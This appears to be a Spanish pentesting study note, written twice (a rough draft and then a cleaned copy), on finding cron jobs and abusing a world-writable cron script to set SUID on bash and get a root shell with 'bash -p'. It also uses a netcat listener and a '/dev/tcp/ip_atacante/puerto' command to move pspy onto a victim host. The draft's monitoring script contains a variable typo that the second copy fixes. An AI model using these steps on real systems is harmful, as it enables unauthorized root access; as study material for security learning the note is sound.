


Para definir una tarea cron puedes ejecutar el siguiente comando

```bash
crontab -e
```

Esto te abrira un archivo donde puedes definir una tarea cron con la siguiente estructura 


La estructura de una tarea cron sigue el siguiente formato:

```
* * * * * comando_a_ejecutar
- - - - -
| | | | |
| | | | +----- Día de la semana (0 - 7) (Domingo es 0 o 7)
| | | +------- Mes (1 - 12)
| | +--------- Día del mes (1 - 31)
| +----------- Hora (0 - 23)
+------------- Minuto (0 - 59)
```

Cada uno de los cinco campos (minuto, hora, día del mes, mes y día de la semana) define cuándo se ejecutará el comando especificado. Puedes utilizar asteriscos (`*`) para indicar "cada" en un campo, o puedes especificar un rango (por ejemplo, `1-5`), una lista de valores (por ejemplo, `1,15,30`), o utilizar un asterisco para indicar "cada" en un campo específico.

Por ejemplo:

- `* * * * * comando_a_ejecutar` ejecutará el comando cada minuto.
- `0 * * * * comando_a_ejecutar` ejecutará el comando al principio de cada hora.
- `0 0 * * * comando_a_ejecutar` ejecutará el comando una vez al día, a la medianoche.
- `0 0 * * 1 comando_a_ejecutar` ejecutará el comando a la medianoche de cada lunes.
- `0 0 1 * * comando_a_ejecutar` ejecutará el comando a la medianoche del primer día de cada mes.

Y así sucesivamente. Es importante recordar que el cron se ejecuta en el huso horario del sistema donde está configurado.


Tenemos un ejemplo de como podemos abusar de estas tareas cron

Primero tenemos que enumerar las tareas cron que se estan ejecutando para eso podemos usar el siguiente script:



```bash
#!/bin/bash


old_process=$(ps -eo user,command)

while true; do

	new_process=$(ps -eo user,command)
	diff <(echo "old_procces") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
	old_process=$new_process
done
 ```

este script monitorea cambios en los procesos en ejecución asi que si lo ejecutamos desde un directorio con permisos de escritura podremos ver si hay alguna tarea cron existente 


![[Pasted image 20240225193153.png]]

Al ejecutarlo podemos ver que al parecer hay una tarea cron que ejecuta un script el cual esta en el directorio tmp 

![[Pasted image 20240225193415.png]]
Al analziar el script nos podemos dar cuenta de que tiene permisos de escritura para otros usuarios ahora lo que podemos hacer es modifcar el archivo para que cuando se ejecute el script se le otorge el permiso suid a una bash y asi cualquier usuario pueda obtener una bash como superusuario 

![[Pasted image 20240225193826.png]]

Ahora al guardar y ver los permisos del binario bash podemos ver que tiene el permiso suid agregado

![[Pasted image 20240225193924.png]]


Entonces ahora podemos ejecutar el siguiente comando el cual nos otorgara una bash como root gracias a que el propietario es root y bash tiene permiso suid 

```bash
bash -p
```


Otra forma de poder enumerar las tareas cron es con ayuda de pspy para esto podemos entrar al siguiente enlace y descargar la ultima version del pspy

![[Pasted image 20240225202558.png]]

Ahora ya descargado en la maquina atacante lo que podemos hacer si la maquina victima no tiene curl o wget es ponernos en escucha en la maquina atacante y mandar el archivo con el siguiente comando

```bash
nc -lvnp puerto < pspy64
```

ahora lo que debemos hacer en la maquina victima es ejecutar este comando para asi descagar el archivo de la maquina atacante

```bash
cat < /dev/tcp/ip_atacante/puerto > pspy64
```

Ahora solo verificamos si los son iguales con el uso de md5

![[Pasted image 20240225203844.png]]

Listo todo esta correcto 


Ahora solo queda dar permisos de ejecucion y ejecutarlo 

![[Pasted image 20240225204013.png]]

perfecto ahora podemos ver todos los procesos que se estan ejecutando y asi detectar las tareas cron en ejecucion 





# Detección y explotación de tareas Cron


Las tareas cron son procesos automatizados en sistemas Unix y Unix-like que ejecutan comandos en un horario específico definido por el usuario, utilizados para realizar tareas repetitivas como copias de seguridad o actualizaciones. Sin embargo, su abuso puede resultar en vulnerabilidades significativas, permitiendo a los atacantes ejecutar comandos maliciosos en momentos específicos o obtener acceso no autorizado al sistema. Detectar y explotar estas tareas implica comprender su funcionamiento y configuración en el sistema, lo que puede permitir a los atacantes identificar oportunidades para comprometer el sistema mediante la escalada de privilegios o el acceso a datos sensibles, siendo una técnica utilizada durante la fase de enumeración y explotación de sistemas en seguridad informática.

Para definir una tarea cron, puedes ejecutar el siguiente comando:

```bash
crontab -e
```

Esto te abrirá un archivo donde puedes definir una tarea cron con la siguiente estructura.

La estructura de una tarea cron sigue el siguiente formato:

```
* * * * * comando_a_ejecutar
- - - - -
| | | | |
| | | | +----- Día de la semana (0 - 7) (Domingo es 0 o 7)
| | | +------- Mes (1 - 12)
| | +--------- Día del mes (1 - 31)
| +----------- Hora (0 - 23)
+------------- Minuto (0 - 59)
```

Cada uno de los cinco campos (minuto, hora, día del mes, mes y día de la semana) define cuándo se ejecutará el comando especificado. Puedes utilizar asteriscos (`*`) para indicar "cada" en un campo, o puedes especificar un rango (por ejemplo, `1-5`), una lista de valores (por ejemplo, `1,15,30`), o utilizar un asterisco para indicar "cada" en un campo específico.

Por ejemplo:

- `* * * * * comando_a_ejecutar` ejecutará el comando cada minuto.
- `0 * * * * comando_a_ejecutar` ejecutará el comando al principio de cada hora.
- `0 0 * * * comando_a_ejecutar` ejecutará el comando una vez al día, a la medianoche.
- `0 0 * * 1 comando_a_ejecutar` ejecutará el comando a la medianoche de cada lunes.
- `0 0 1 * * comando_a_ejecutar` ejecutará el comando a la medianoche del primer día de cada mes.

Y así sucesivamente. Es importante recordar que el cron se ejecuta en el huso horario del sistema donde está configurado.

Tenemos un ejemplo de cómo podemos abusar de estas tareas cron.

Primero, tenemos que enumerar las tareas cron que se están ejecutando. Para eso, podemos usar el siguiente script:

```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
	old_process=$new_process
done
```

Este script monitorea cambios en los procesos en ejecución. Entonces, si lo ejecutamos desde un directorio con permisos de escritura, podremos ver si hay alguna tarea cron existente.

![[Pasted image 20240225193153.png]]

Al ejecutarlo, podemos ver que aparentemente hay una tarea cron que ejecuta un script que está en el directorio `tmp`.

![[Pasted image 20240225193415.png]]

Al analizar el script, nos podemos dar cuenta de que tiene permisos de escritura para otros usuarios. Ahora, lo que podemos hacer es modificar el archivo para que, cuando se ejecute el script, se le otorge el permiso SUID a una bash y así cualquier usuario pueda obtener una bash como superusuario.

![[Pasted image 20240225193826.png]]

Ahora, al guardar y ver los permisos del binario `bash`, podemos ver que tiene el permiso SUID agregado.

![[Pasted image 20240225193924.png]]

Entonces, ahora podemos ejecutar el siguiente comando, el cual nos otorgará una bash como root gracias a que el propietario es root y bash tiene permiso SUID:

```bash
bash -p
```

Otra forma de poder enumerar las tareas cron es con ayuda de `pspy`. Para esto, podemos entrar al siguiente enlace y descargar la última versión del `pspy`.

![[Pasted image 20240225202558.png]]

Ahora, ya descargado en la máquina atacante, lo que podemos hacer si la máquina víctima no tiene `curl` o `wget` es ponernos en escucha en la máquina atacante y mandar el archivo con el siguiente comando:

```bash
nc -lvnp puerto < pspy64
```

Ahora, lo que debemos hacer en la máquina víctima es ejecutar este comando para así descargar el archivo de la máquina atacante:

```bash
cat < /dev/tcp/ip_atacante/puerto > pspy64
```

Ahora solo verificamos si los son iguales con el uso de `md5`.

![[Pasted image 20240225203844.png]]

Listo, todo está correcto.

Ahora solo queda dar permisos de ejecución y ejecutarlo.

![[Pasted image 20240225204013.png]]

Perfecto, ahora podemos ver todos los procesos que se están ejecutando y así detectar las tareas cron en ejecución.